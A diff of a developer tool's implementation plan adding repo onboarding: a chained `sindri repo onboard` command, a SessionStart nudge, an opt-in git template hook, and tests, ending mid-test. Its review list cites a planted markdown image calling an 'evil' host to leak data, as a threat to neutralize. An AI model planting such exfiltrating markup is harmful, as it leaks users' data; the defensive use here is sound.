@@ -6,6 +6,8 @@
 
 **Architecture:** A new `sindri/src/scope/` module. Sources are typed adapters (`file`, `notes`, `transcripts`, `linear`, and `code` over the Plan 3 index) behind the §11.2 `Source` interface. Each returns records that were stripped of hidden or remote content (spec §8.3) and scrubbed of secrets, with stable reference ids (`R1…`). A `ModelRunner` runs `claude -p` with no tools, a JSON schema, an effort level and a minimal environment. It is the only path to a model, it refuses providers outside `providers.allowed`, and it scrubs every input before it leaves the process (spec §8.4). A metering wrapper charges one shared token budget and writes one audit row per call. The scope map is a Zod type. Its deterministic checks (every surface cited by a real reference, every surface in a workstream, an acyclic dependency graph, at least one surface) gate each round, and the challenger model (a different model from the drafter, spec §6.1 diversity) proposes missing surfaces until none are new or the round cap is hit. Everything rendered to Markdown is neutralized first, because the model saw untrusted text. Runs are recorded in the ledger (migration v3).
 
+**Repo onboarding (Task 10):** `sindri repo onboard [<path>]` chains the Plan 3 pieces (`repo add`, the approval check, the pre-commit hook and a first index build) and stops at approval, which stays a human step at a terminal. A SessionStart nudge on all three providers names a repo that isn't onboarded. `sindri repo onboard --template` is an opt-in git template, so new clones get a pre-commit hook that does nothing until the repo is approved. This is not scoping, but it is what makes the scoping and index work reach every repo, not only the ones someone remembered to set up.
+
 **Tech Stack:** TypeScript 5.7 strict, ESM, Node >= 20.11, Vitest 2 (v8, 100%), Zod 3, better-sqlite3 13; the Claude Code CLI (`claude -p --json-schema --output-format json`), as `judge` already uses it; Linear's GraphQL API (read-only token) through `fetch`.
 
 **Spec:** `docs/superpowers/specs/2026-10-07-sindri-design.md`. This plan implements §7.5 (scoping harness and backtest) and the Scoping row of the §6 Step table, using §11.2 `Source` adapters, §6.1's provider rules (Anthropic-only by default, a different model for the challenger), §8.3 ingest stripping and §8.4 scrubbing at egress. It is §13.3 row 8.
@@ -16,12 +18,13 @@
 
 - A `claude` CLI that is logged in and supports `--json-schema`, `--tools`, `--effort` and `--disable-slash-commands`. Check with `claude --version` and `claude -p hello`. Sindri passes the child process only `HOME`, `PATH`, `USER`, `LANG`, `TERM` and `TMPDIR` (plus its own `AW_*` flags), so sign in with `claude login`; an API key in the environment is not forwarded.
 - Joi's terminal for `sindri profile approve` (it needs a TTY and a typed confirmation).
-- For the Task 11 backtest only: a read-only Linear API key and the URL of the motivating project. Ask Joi for both **at the start of Task 11**, not after the PR is otherwise done.
+- For the Task 12 backtest only: a read-only Linear API key and the URL of the motivating project. Ask Joi for both **at the start of Task 12**, not after the PR is otherwise done.
+- For Task 12 Step 6 only: a second repo to onboard (any repo of Joi's choosing that is not yet in the profile), and Joi at a terminal for its `sindri profile approve`.
 - One heavy job at a time (Joi's 2026-09-25 rule): run `npm run typecheck` and `npm run test:coverage` once per commit, never two at once, and do not run `npm install` unless a dependency is actually missing.
 
 ## Spec amendments in this plan
 
-Each is also edited into the spec in Task 10.
+Each is also edited into the spec in Task 11.
 
 1. **The Scoping direction check (§6.1, §7.5 step 3) is not in this plan.** Direction checks need the relay, HMAC turns and verdict delivery from rollout step 3a. Until then, the adversarial missing-surface loop (§7.5 step 2) is the verifier, run on a different model from the drafter. Step 5 adds the direction check, which is when spec §13.2 says it starts anyway.
 2. **Delivery writes the scope map to a file** (`--out`, default `sources.notesDir`), with files 0600 and directories 0700. Attaching it to the tracker project is a write that needs the step-3a outward-write path (§8.1, §8.5), so it is deferred. Creating issues from the map stays needs-approval, as the spec says. `sindri scope` refuses to write inside a git worktree unless `--sources` is restricted to `file` and/or `code` (amendment 8).
@@ -33,10 +36,11 @@ Each is also edited into the spec in Task 10.
 8. **Ingest stripping and public-repo safety (§8.3, §8.4).** Every source strips HTML comments, zero-width and bidi characters, long encoded blobs and remote image or link URLs before scrubbing. `sources.transcripts.enabled` defaults to `false` (opt-in). `sindri scope` accepts `--sources <list>`, and inside a git worktree only `--sources file,code` is allowed (`SND-SCOPE-025`). The Linear `apiUrl` is pinned to `https://api.linear.app/graphql` unless the profile sets `allowCustomApiUrl: true`. The `claude -p` child gets an allowlisted environment. Rendered Markdown never carries source-derived active content.
 9. **Error areas `SCOPE` and `SECRET`** join the §10.3 area list.
 10. **Model-call audit (§6.1, §8.5).** A `model_calls` ledger table records one row per model call (run id, role, model, tokens), written with the run's `scope_runs` row.
+11. **Repo onboarding (§10.3, §11.3).** `sindri repo onboard [<path>]` chains `repo add`, an approval check, the pre-commit hook and a first `index build --repo` (one try at the heavy-job lock). It never approves: while the repo is not in the approved profile, it prints the exact `sindri profile approve` commands and exits 1, because approving a profile change stays a deliberate human step at a terminal (§8.7, invariant 10). `sindri repo status [<path>] [--nudge]` is read-only (no ledger migration or write, no lock) and drives a SessionStart nudge on Claude Code, Codex and Cursor. `sindri repo onboard --template` sets git's `init.templateDir`, only when it is unset, to a sindri-owned template. Its pre-commit hook does nothing until the repo is in the approved profile. `core.hooksPath` is never used, and another tool's template dir is never written.
 
 ## Global Constraints
 
-- Node >= 20.11, TypeScript 5.7 strict, ESM (Node16), no `any`, no `/* v8 ignore */`. Each task covers the files it touches; Task 10's merge-gate run is 100% over the package.
+- Node >= 20.11, TypeScript 5.7 strict, ESM (Node16), no `any`, no `/* v8 ignore */`. Each task covers the files it touches; Task 11's merge-gate run is 100% over the package.
 - **Providers (spec §6.1, R3):** only providers in `providers.allowed` (default `anthropic`, `jev`) are ever called; this plan calls only `anthropic` through the Claude CLI. The challenger and adjudicator models must differ from the drafter's model; the profile schema refuses a profile where they don't, so a run can never silently reuse the drafter's model.
 - **Egress scrubbing (spec §8.4):** every string sent to a model passes the scrubber first; source records are stripped and scrubbed at fetch. Nothing from a source becomes an instruction: the prompt fences all source text, the brief, fix reasons and the map JSON in `<untrusted …>…</untrusted>` (spec §8.3).
 - **Rendered output (spec §8.3):** model-written and source-derived strings are neutralized (`safeText`) before they reach Markdown.
@@ -44,6 +48,9 @@ Each is also edited into the spec in Task 10.
 - **Budgets:** each scoping run has `scope.maxTokensPerRun` and each backtest `scope.maxTokensPerBacktest`, charged from the CLI's reported usage (failed-parse calls included) in one `Budget`, plus `scope.maxRounds`. Hitting either stops with what passed so far, marked `incomplete` (spec §6 Step contract).
 - One heavy job at a time: model jobs are not heavy (they're remote), but a run that builds the index takes the heavy lock through Plan 3's builder.
 - No human hand-labeling; no workplace specifics in code, defaults or examples.
+- **Approval stays a human checkpoint (spec §8.7, invariant 10).** `sindri repo onboard` never runs `profile approve`, never fakes a TTY and never pipes a confirmation. It prints the command and exits 1. Task 12 has Joi approve at a terminal.
+- **Hooks never write (spec §5.2).** The nudge and the template hook's gate read the approved profile through `openLedgerReadOnly`. They never migrate, lock or write the ledger. The nudge is bounded (`AW_SINDRI_NUDGE_BUDGET_MS`, default 1500), always exits 0 and is silent on any error.
+- **Git config.** Never set `core.hooksPath`. `init.templateDir` is set only when it is unset or already sindri's. Never write into a directory sindri didn't create. Never overwrite a foreign pre-commit hook (`SND-SCRUB-003`).
 - Tick each step's checkbox in this plan file in the same commit that completes it. Commit format `type: short description`, with the session's attribution lines.
 
 ## Review Focus
@@ -56,6 +63,8 @@ Each is also edited into the spec in Task 10.
 6. **Active content in the rendered map** (a planted `![](https://evil/?d=x)`, an `<img>`, a link). It must be inert in the file. Pinned in Task 5.
 7. **A scope map written into a public repo.** Inside a git worktree, only `--sources file,code` is allowed. Pinned in Task 8.
 8. **A recall number that cannot be trusted** (an unstable adjudicator, a cited surface that doesn't exist, a bloated map). Two agreeing runs, surface validation, precision and a baseline guard it. Pinned in Task 9.
+9. **Onboarding that bypasses or blurs approval.** Look for a `repo onboard` that installs the hook or builds before the repo is in the approved profile, a rerun that isn't idempotent, or a busy heavy lock that makes it wait. The template hook must not block commits in a repo nobody onboarded, `init.templateDir` must not be overwritten, and `core.hooksPath` must never be set. Pinned in Task 10.
+10. **A SessionStart nudge that slows, blocks or writes.** The risky cases are a slow or hung `sindri`, a session outside git, sindri not installed, a child `claude -p` session, and a linked worktree of an onboarded repo. Each must stay silent within the budget, never write the ledger, and print at most one line. Pinned in Task 10.
 
 ---
 
@@ -77,6 +86,10 @@ Each is also edited into the spec in Task 10.
 | `sindri/src/scope/backtest.ts` | As-of brief, two-run adjudication of recall and precision, baseline, pass bar, report |
 | `sindri/src/scope/commands.ts` | `sindri scope`, `scope runs`, `--dry-run`, `--sources`, `--backtest` |
 | `docs/sindri/scope.md` | How to scope and backtest |
+| `sindri/src/index/onboard.ts` | `repoState` (read-only), `nudgeLine`, `onboard` (repo add → approval check → pre-commit → first index build), `installTemplate` (`init.templateDir`) |
+| `sindri/src/scrub/commands.ts` (modify) | `installPreCommit` (exported), the template variant of `preCommitHook` |
+| `config/hooks/sindri-nudge.sh` | SessionStart nudge (`# aw:sindri-nudge`), bounded, fail-open |
+| `scripts/install-sindri.sh` (modify) | `--hook-only --provider claude\|codex\|cursor` installs the nudge; prints the `--template` hint |
 
 ---
 ### Task 1: Profile keys, secret pointers and ledger migration v3
@@ -1874,7 +1887,7 @@ git commit -m "feat: sindri model runner for bounded scoping jobs"
 
 - [ ] **Step 6: One real call (heavy, once)**
 
-This is the only task that talks to the real CLI before Task 11. It proves the flags, the stdin prompt, the Zod-derived schema and the envelope parsing against the real thing, before Tasks 5 to 9 build on fake envelopes.
+This is the only task that talks to the real CLI before Task 12. It proves the flags, the stdin prompt, the Zod-derived schema and the envelope parsing against the real thing, before Tasks 5 to 9 build on fake envelopes.
 
 Run: `cd sindri && claude --version && npm run test:heavy`
 Expected: `claude --version` prints a version, and the heavy test PASSES (`1 passed`). Put the version in the PR description.
@@ -4431,11 +4444,640 @@ git commit -m "feat: sindri scope --backtest with adjudicated recall, precision,
 
 ---
 
-### Task 10: Docs, merge gate and spec amendments
+### Task 10: Repo onboarding (nudge, template hook, `sindri repo onboard`)
+
+Plan 3 gave each piece of onboarding its own command: `repo add`, `profile approve`, `scrub --install-pre-commit`, `index build --repo`. A repo nobody remembers to onboard never gets the secret scan, shape signals or an index. This task adds one command that chains the pieces, a SessionStart line that says when the current repo isn't onboarded, and an opt-in git template so new clones get the hook. **Approval stays manual:** `repo onboard` stops at the approval step and prints the command, because approving a profile change is the deliberate human checkpoint (spec §8.7, invariant 10). It never fakes a TTY.
+
+**Design choice: the template install lives in `sindri repo onboard --template`, not in `scripts/install-sindri.sh`.** Three reasons. Setting `init.templateDir` changes the user's global git config, so it must be an explicit opt-in, not a side effect of installing the CLI (the same reasoning that keeps wake gating out of `install-judge.sh`). The hook must carry the absolute `SINDRI_BIN` path, which only the installed wrapper knows. And TypeScript code can be unit-tested at 100% under the `GIT_CONFIG_GLOBAL` the tests already isolate. `install-sindri.sh` prints the command as a hint and also installs the nudge hook (`--hook-only --provider X`), the same way `install-judge.sh` installs `judge-health`.
+
+**Files:**
+- Create: `sindri/src/index/onboard.ts`, `config/hooks/sindri-nudge.sh`, `config/hooks/tests/sindri-nudge.test.sh`
+- Modify: `sindri/src/index/repo-add.ts` (route `onboard` and `status`), `sindri/src/scrub/commands.ts` (export `installPreCommit`; a template variant of `preCommitHook`), `sindri/src/main.ts` (repo usage), `sindri/src/errors.ts`, `scripts/install-sindri.sh` (`--hook-only --provider`, the template hint), `providers/{claude,codex,cursor}/install.sh` (call it when `WITH_SINDRI=1`), `scripts/tests/install-sindri.test.sh`, `.agents/rules/hooks.md`, `config/hooks/adapters/README.md`, `AGENTS.md` (the new bash test in Commands and the merge gate)
+- Test: `sindri/tests/repo-onboard.test.ts`, `config/hooks/tests/sindri-nudge.test.sh`, `scripts/tests/install-sindri.test.sh`
+
+**Interfaces:**
+- Consumes: `repoAdd`, `requireProfile` (Plan 3); `approvedProfile`, `openLedgerReadOnly`, `ledgerPath`, `resolveProfileRoot`, `loadProfile` (Plan 2); `buildIndex`, `indexPath`, `embedderOrUnavailable`, `graphFor`, `Step`, `PRE_COMMIT_MARKER`, `isSindriHook`, `preCommitPath` (Plan 3).
+- Produces:
+  - `type RepoState = { kind: "outside-git" } | { kind: "no-approved-profile"; path: string } | { kind: "not-onboarded"; path: string; name?: string } | { kind: "onboarded"; path: string; name: string }`. `name` on `not-onboarded` means the live profile lists the repo and approval is pending.
+  - `repoState(deps, target): Promise<RepoState>`. It is read-only: it opens the ledger with `openLedgerReadOnly` (no migration, no lock, no write) and the live profile with `loadProfile`. It matches the repo's top level **or** its main checkout (`dirname` of `--git-common-dir`, so a linked worktree of an onboarded repo counts as onboarded) against each approved repo's real path.
+  - `installPreCommit(deps, repoPath): Promise<{ hook: string; changed: boolean }>` (moved out of `scrub`'s `install`). It still refuses a foreign hook with `SND-SCRUB-003`, and it replaces a sindri hook of any version, the template variant included.
+  - `preCommitHook(bin, o?: { template?: boolean })` and `TEMPLATE_MARKER`. The template variant exits 0 when the binary is missing, or when `sindri repo status` says the repo isn't onboarded, and otherwise runs the same two lines as the full hook.
+  - `templateDir(deps)`, which is `$AW_STATE_DIR/sindri/git-template`. `installTemplate(deps): Promise<Step>` writes `<templateDir>/hooks/pre-commit` (the template variant, 0755). It sets `git config --global init.templateDir` to that directory only when the key is unset. When the key already points there, the step is `ok`. When it points anywhere else, it refuses with `SND-SCRUB-006` and names the file to copy. It never sets `core.hooksPath`.
+  - `onboard(deps, target, { name?, build }): Promise<{ name: string; steps: Step[]; exitCode: ExitCode }>`. The steps are `repo-add` (`done` or `ok`), then `approval` (`ok`, or `warn` with the exact `sindri profile approve` commands; the remaining steps are then `skip` and the exit code is 1), then `pre-commit` (`done`, `ok`, or `fail` with the `SND-SCRUB-003` fix), then `index-build` (`done`, `ok` when an index exists, `skip` with `--no-build`, or `warn` when the heavy-job lock is busy; it tries the lock once and never waits). The exit code is 0, 1 (approval pending, or a `warn`), or 2 (any `fail`).
+  - CLI:
+    - `sindri repo onboard [<path>] [--name NAME] [--no-build] [--json]`
+    - `sindri repo onboard --template [--json]`
+    - `sindri repo status [<path>] [--nudge] [--json]`. Without `--nudge` it exits 0 when the repo is onboarded and 1 otherwise; the template hook uses it as its gate. `--nudge` prints at most one line and always exits 0. It is silent outside git, when no profile is approved yet, when the repo is onboarded, and on any error.
+  - `config/hooks/sindri-nudge.sh` (`# aw:sindri-nudge`), a SessionStart hook. It is silent unless `sindri repo status --nudge` prints a line. It is killed after `AW_SINDRI_NUDGE_BUDGET_MS` (default 1500), always exits 0, and skips `AW_JUDGE_CHILD` and `AW_SINDRI_CHILD` sessions.
+  - `scripts/install-sindri.sh --hook-only --provider claude|codex|cursor` installs the nudge for that provider (Codex and Cursor go through their adapters), and `AW_DRY_RUN=1` prints it.
+
+- [ ] **Step 1: Write the failing tests**
+
+`sindri/tests/repo-onboard.test.ts`:
+
+```ts
+import { execFileSync, spawnSync } from "node:child_process";
+import fs from "node:fs";
+import path from "node:path";
+import { describe, expect, it } from "vitest";
+
+import { stateDir, type Deps } from "../src/deps.js";
+import { withHeavyLock } from "../src/index/heavy-lock.js";
+import { indexPath } from "../src/index/db.js";
+import { templateDir } from "../src/index/onboard.js";
+import { ledgerPath } from "../src/ledger/db.js";
+import { runCli } from "../src/main.js";
+import { PRE_COMMIT_MARKER, TEMPLATE_MARKER, preCommitHook } from "../src/scrub/commands.js";
+import { fakeGit, git, gitRepo, makeDeps, tempDir } from "./helpers.js";
+import { approvedIndexDeps, ring0Repo } from "./index-fixtures.js";
+
+async function approve(d: Deps): Promise<void> {
+  const hash = JSON.parse((await runCli(["profile", "approve", "--json"], d)).stdout).hash as string;
+  await runCli(["profile", "approve", hash], { ...d, isTTY: true, prompt: async () => hash.slice(0, 6) });
+}
+const hookOf = (repo: string): string => path.join(repo, ".git", "hooks", "pre-commit");
+const steps = (stdout: string): Record<string, string> =>
+  Object.fromEntries((JSON.parse(stdout) as { steps: { name: string; status: string }[] }).steps.map((s) => [s.name, s.status]));
+
+describe("sindri repo onboard", () => {
+  it("adds the repo, stops at approval with the exact command, and does nothing else until approved", async () => {
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    const target = gitRepo({ "b.ts": "export const b = 1;\n" });
+    const r = await runCli(["repo", "onboard", target, "--name", "web"], d);
+    expect(r.exitCode).toBe(1);
+    expect(r.stdout).toMatch(/done\s+repo-add/);
+    expect(r.stdout).toMatch(/warn\s+approval/);
+    expect(r.stdout).toMatch(/sindri profile approve [0-9a-f]{12}/);
+    expect(r.stdout).toMatch(/skip\s+pre-commit/);
+    expect(fs.existsSync(hookOf(target))).toBe(false);
+    expect(fs.existsSync(indexPath(d, "web"))).toBe(false);
+    // Idempotent: a rerun before approval adds nothing and still stops.
+    const again = await runCli(["repo", "onboard", target, "--name", "web", "--json"], d);
+    expect(again.exitCode).toBe(1);
+    expect(steps(again.stdout)).toEqual({ "repo-add": "ok", approval: "warn", "pre-commit": "skip", "index-build": "skip" });
+  });
+
+  it("after approval installs the full hook (replacing a template copy) and builds the index; a rerun is all ok", async () => {
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    const target = gitRepo({ "b.ts": "export const b = 1;\n" });
+    await runCli(["repo", "onboard", target, "--name", "web"], d);
+    await approve(d);
+    fs.mkdirSync(path.dirname(hookOf(target)), { recursive: true });
+    fs.writeFileSync(hookOf(target), preCommitHook("/x/sindri", { template: true }));
+    const r = await runCli(["repo", "onboard", target, "--name", "web", "--json"], d);
+    expect(r.exitCode).toBe(0);
+    expect(steps(r.stdout)).toEqual({ "repo-add": "ok", approval: "ok", "pre-commit": "done", "index-build": "done" });
+    const hook = fs.readFileSync(hookOf(target), "utf8");
+    expect(hook).toContain(PRE_COMMIT_MARKER);
+    expect(hook).not.toContain(TEMPLATE_MARKER);
+    expect(fs.existsSync(indexPath(d, "web"))).toBe(true);
+    const again = await runCli(["repo", "onboard", target, "--name", "web", "--json"], d);
+    expect(steps(again.stdout)).toEqual({ "repo-add": "ok", approval: "ok", "pre-commit": "ok", "index-build": "ok" });
+  });
+
+  it("a busy heavy lock is a warn (never a wait); --no-build skips; a foreign hook fails its step (exit 2) and is left alone", async () => {
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    const target = gitRepo({ "b.ts": "1" });
+    await runCli(["repo", "onboard", target, "--name", "web"], d);
+    await approve(d);
+    // Same-process nesting: buildIndex's single try at the lock fails (see heavy-lock.test.ts). If the lock
+    // ever treats the same pid as reentrant, hold it from a child process with config/lib/locks.sh instead.
+    const busy = await withHeavyLock(d, "other-job", 0, () => runCli(["repo", "onboard", target, "--name", "web", "--json"], d));
+    expect(busy.exitCode).toBe(1);
+    expect(steps(busy.stdout)).toEqual({ "repo-add": "ok", approval: "ok", "pre-commit": "done", "index-build": "warn" });
+    expect(steps((await runCli(["repo", "onboard", target, "--name", "web", "--no-build", "--json"], d)).stdout)["index-build"]).toBe("skip");
+    fs.writeFileSync(hookOf(target), "#!/bin/sh\necho theirs\n");
+    const r = await runCli(["repo", "onboard", target, "--name", "web", "--no-build", "--json"], d);
+    expect(r.exitCode).toBe(2);
+    expect(r.stdout).toContain("SND-SCRUB-003");
+    expect(fs.readFileSync(hookOf(target), "utf8")).toBe("#!/bin/sh\necho theirs\n");
+    expect(fs.existsSync(indexPath(d, "web"))).toBe(false);
+  });
+
+  it("refuses what repo add refuses (not a repo, bad name) and bad usage", async () => {
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    expect((await runCli(["repo", "onboard", "/"], d)).stderr).toContain("SND-PROFILE-009");
+    expect((await runCli(["repo", "onboard", gitRepo({ "a": "1" }), "--name", "Bad Name"], d)).stderr).toContain("SND-PROFILE-014");
+    expect((await runCli(["repo", "onboard", "--template", "x"], d)).stderr).toContain("SND-CLI-002");
+  });
+});
+
+describe("sindri repo status", () => {
+  it("nudges once for a repo outside the approved profile, and is silent outside git, before any approval and once onboarded", async () => {
+    const fresh = makeDeps();
+    const target = gitRepo({ "b.ts": "1" });
+    const nudge = (d: Deps, p: string) => runCli(["repo", "status", p, "--nudge"], d);
+    expect((await nudge(fresh, target)).stdout).toBe("");
+    expect(fs.existsSync(ledgerPath(stateDir(fresh)))).toBe(false); // read-only: never creates the ledger
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    expect((await nudge(d, tempDir())).stdout).toBe("");
+    const before = fs.readFileSync(ledgerPath(stateDir(d)));
+    const n = await nudge(d, target);
+    expect(n.exitCode).toBe(0);
+    expect(n.stdout.trim().split("\n")).toHaveLength(1);
+    expect(n.stdout).toContain("sindri repo onboard");
+    expect(fs.readFileSync(ledgerPath(stateDir(d)))).toEqual(before); // never writes the ledger
+    expect((await runCli(["repo", "status", target], d)).exitCode).toBe(1);
+    await runCli(["repo", "onboard", target, "--name", "web"], d);
+    expect((await nudge(d, target)).stdout).toContain("waiting for approval");
+    await approve(d);
+    expect((await nudge(d, target)).stdout).toBe("");
+    expect((await runCli(["repo", "status", target], d)).exitCode).toBe(0);
+  });
+
+  it("counts a linked worktree of an onboarded repo as onboarded", async () => {
+    const d = await approvedIndexDeps(ring0Repo({ "a.ts": "1" }));
+    const target = gitRepo({ "b.ts": "1" });
+    await runCli(["repo", "onboard", target, "--name", "web", "--no-build"], d);
+    await approve(d);
+    const wt = path.join(tempDir(), "wt");
+    git(target, "worktree", "add", "-q", wt, "-b", "side");
+    expect((await runCli(["repo", "status", wt], d)).exitCode).toBe(0);
+  });
+});
+
+describe("sindri repo onboard --template", () => {
+  const withGlobal = (d: Deps, file: string): Deps => ({ ...d, env: { ...d.env, GIT_CONFIG_GLOBAL: file, SINDRI_BIN: "/opt/bin/sindri" } });
+  const globalGet = (file: string, key: string): string | null => {
+    const r = spawnSync("git", ["config", "--file", file, "--get", key], { encoding: "utf8" });
+    return r.status === 0 ? r.stdout.trim() : null;
+  };
+
+  it("sets init.templateDir when unset, writes the gated hook, never core.hooksPath, and is idempotent", async () => {
+    const cfg = path.join(tempDir(), "gitconfig");
+    fs.writeFileSync(cfg, "");
+    const d = withGlobal(makeDeps(), cfg);
+    const r = await runCli(["repo", "onboard", "--template"], d);
+    expect(r.exitCode).toBe(0);
+    expect(r.stdout).toMatch(/done\s+template/);
+    expect(globalGet(cfg, "init.templateDir")).toBe(templateDir(d));
+    expect(globalGet(cfg, "core.hooksPath")).toBeNull();
+    const hook = path.join(templateDir(d), "hooks", "pre-commit");
+    expect(fs.statSync(hook).mode & 0o777).toBe(0o755);
+    expect(fs.readFileSync(hook, "utf8")).toContain(TEMPLATE_MARKER);
+    expect(fs.readFileSync(hook, "utf8")).toContain("SINDRI='/opt/bin/sindri'");
+    expect((await runCli(["repo", "onboard", "--template"], d)).stdout).toMatch(/ok\s+template/);
+    // A new binary path refreshes the hook.
+    expect((await runCli(["repo", "onboard", "--template"], { ...d, env: { ...d.env, SINDRI_BIN: "/new/sindri" } })).stdout).toMatch(/done\s+template/);
+    // git init copies it into a new repo.
+    const fresh = tempDir();
+    execFileSync("git", ["init", "-q", fresh], { env: { ...process.env, GIT_CONFIG_GLOBAL: cfg } });
+    expect(fs.readFileSync(hookOf(fresh), "utf8")).toContain(TEMPLATE_MARKER);
+  });
+
+  it("refuses a templateDir that isn't sindri's, changes nothing in it, and names the file to copy", async () => {
+    const cfg = path.join(tempDir(), "gitconfig");
+    const theirs = tempDir();
+    fs.writeFileSync(cfg, `[init]\n\ttemplateDir = ${theirs}\n`);
+    const d = withGlobal(makeDeps(), cfg);
+    const r = await runCli(["repo", "onboard", "--template"], d);
+    expect(r.exitCode).toBe(2);
+    expect(r.stderr).toContain("SND-SCRUB-006");
+    expect(r.stderr).toContain(path.join(templateDir(d), "hooks", "pre-commit"));
+    expect(globalGet(cfg, "init.templateDir")).toBe(theirs);
+    expect(fs.readdirSync(theirs)).toEqual([]);
+  });
+
+  it("reports a git config it can't read or set as SND-SCRUB-006", async () => {
+    const d = makeDeps({ git: fakeGit({ "config --global --get init.templateDir": { ok: false, stderr: "fatal: bad config line 1", code: 128 } }) });
+    expect((await runCli(["repo", "onboard", "--template"], d)).stderr).toContain("could not read init.templateDir");
+    const base = makeDeps();
+    const d2 = { ...base, git: fakeGit({ "config --global --get init.templateDir": { ok: false, stderr: "", code: 1 }, [`config --global init.templateDir ${templateDir(base)}`]: { ok: false, stderr: "error: could not lock config file" } }) };
+    expect((await runCli(["repo", "onboard", "--template"], d2)).stderr).toContain("SND-SCRUB-006");
+  });
+
+  it("the template hook is a no-op until the repo is onboarded, and scans once it is", () => {
+    const dir = tempDir();
+    const log = path.join(dir, "calls.log");
+    const fake = path.join(dir, "sindri");
+    fs.writeFileSync(fake, `#!/bin/sh\necho "$*" >> '${log}'\n[ "$1 $2" = "repo status" ] && exit "\${STATUS:-1}"\nexit 0\n`, { mode: 0o755 });
+    const hook = path.join(dir, "pre-commit");
+    fs.writeFileSync(hook, preCommitHook(fake, { template: true }), { mode: 0o755 });
+    const run = (env: Record<string, string>) => spawnSync("sh", [hook], { env: { ...process.env, ...env }, encoding: "utf8" });
+    expect(run({ STATUS: "1" }).status).toBe(0);
+    expect(fs.readFileSync(log, "utf8")).toBe("repo status\n");
+    fs.rmSync(log);
+    expect(run({ STATUS: "0" }).status).toBe(0);
+    expect(fs.readFileSync(log, "utf8")).toBe("repo status\nscrub --staged\nshape --record --staged\n");
+    fs.rmSync(fake);
+    expect(run({}).status).toBe(0); // a missing binary is a no-op in the template copy (the full hook fails closed)
+  });
+});
+```
+
+`config/hooks/tests/sindri-nudge.test.sh` (stub `sindri` on `PATH`, temp `HOME`, the same `check` helper as `codex-adapter.test.sh`):
+
+```bash
+#!/usr/bin/env bash
+# Tests for config/hooks/sindri-nudge.sh. Run: bash config/hooks/tests/sindri-nudge.test.sh
+set -uo pipefail
+DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+HOOKS="$(cd "$DIR/.." && pwd)"
+HOOK="$HOOKS/sindri-nudge.sh"
+fail=0
+check() {
+  if [ "$2" == "$3" ]; then echo "ok - $1"; else
+    echo "not ok - $1"; echo "  expected: $3"; echo "  actual:   $2"; fail=1
+  fi
+}
+WORK="$(mktemp -d)"
+trap 'rm -rf "$WORK"' EXIT
+export HOME="$WORK/home"; mkdir -p "$HOME"
+unset AW_JUDGE_CHILD AW_SINDRI_CHILD
+REPO="$WORK/repo"; mkdir -p "$REPO"; git -C "$REPO" init -q
+BIN="$WORK/bin"; mkdir -p "$BIN"
+cat > "$BIN/sindri" <<'EOF'
+#!/usr/bin/env bash
+echo "$*" >> "$CALLS"
+[ -n "${SLEEP:-}" ] && sleep "$SLEEP"
+printf '%s\n' "sindri: repo is not onboarded; run: sindri repo onboard" "second line"
+EOF
+chmod +x "$BIN/sindri"
+export CALLS="$WORK/calls"
+
+run() { (cd "$1" && PATH="$2:/usr/bin:/bin" bash "$HOOK"); }
+
+OUT="$(run "$REPO" "$WORK/none")"; RC=$?
+check "no sindri: silent" "$OUT" ""
+check "no sindri: exit 0" "$RC" "0"
+OUT="$(run "$WORK" "$BIN")"
+check "outside git: silent" "$OUT" ""
+check "outside git: sindri not called" "$(cat "$CALLS" 2>/dev/null)" ""
+OUT="$(run "$REPO" "$BIN")"
+check "in a repo: exactly the first line" "$OUT" "sindri: repo is not onboarded; run: sindri repo onboard"
+check "in a repo: asks repo status --nudge" "$(cat "$CALLS")" "repo status --nudge"
+START=$(date +%s)
+OUT="$(SLEEP=5 AW_SINDRI_NUDGE_BUDGET_MS=300 run "$REPO" "$BIN")"; RC=$?
+check "slow sindri: killed, silent" "$OUT" ""
+check "slow sindri: exit 0" "$RC" "0"
+check "slow sindri: returns within 3 s" "$(( $(date +%s) - START < 3 ))" "1"
+OUT="$(AW_SINDRI_CHILD=1 run "$REPO" "$BIN")"
+check "sindri child session: silent" "$OUT" ""
+OUT="$(AW_JUDGE_CHILD=1 run "$REPO" "$BIN")"
+check "judge child session: silent" "$OUT" ""
+# Through the Codex adapter (plain text on SessionStart becomes developer context).
+sed "s|__CWD__|$REPO|" "$DIR/fixtures/codex/sessionstart.json" > "$WORK/ss.json"
+OUT="$(PATH="$BIN:/usr/bin:/bin" bash "$HOOKS/adapters/codex.sh" "$HOOK" < "$WORK/ss.json")"
+check "codex adapter: line passes through" "$(printf '%s' "$OUT" | grep -c 'sindri repo onboard')" "1"
+# Through the Cursor adapter (text becomes additional_context).
+sed "s|__CWD__|$REPO|" "$DIR/fixtures/cursor/session-start.json" > "$WORK/cs.json"
+OUT="$(PATH="$BIN:/usr/bin:/bin" bash "$HOOKS/adapters/cursor.sh" "$HOOK" < "$WORK/cs.json")"
+check "cursor adapter: additional_context" "$(printf '%s' "$OUT" | jq -r '.additional_context' | grep -c 'sindri repo onboard')" "1"
+exit $fail
+```
+
+If the Cursor fixture has no `__CWD__` placeholder, copy the one `cursor-adapter.test.sh` uses for `sessionStart` and set `workspace_roots[0]` to `$REPO` with `jq`.
+
+In `scripts/tests/install-sindri.test.sh`, add:
+
+```bash
+test_nudge_hook_per_provider() {
+  local out settings
+  out="$(AW_DRY_RUN=1 bash "$ROOT/scripts/install-sindri.sh" --hook-only --provider codex)"
+  grep -q "would install sindri-nudge (SessionStart) for codex" <<<"$out" || { echo "FAIL: codex dry-run line missing"; exit 1; }
+  out="$(AW_DRY_RUN=1 bash "$ROOT/scripts/install-sindri.sh" --hook-only --provider cursor)"
+  grep -q "would install sindri-nudge (sessionStart) for cursor" <<<"$out" || { echo "FAIL: cursor dry-run line missing"; exit 1; }
+  settings="$TMP/settings.json"; echo '{}' > "$settings"
+  CLAUDE_SETTINGS_FILE="$settings" CLAUDE_HOOKS_DIR="$TMP/hooks" bash "$ROOT/scripts/install-sindri.sh" --hook-only > /dev/null
+  [ "$(jq '[.hooks.SessionStart[].hooks[].command | select(test("# aw:sindri-nudge$"))] | length' "$settings")" = "1" ] || { echo "FAIL: claude SessionStart entry missing"; exit 1; }
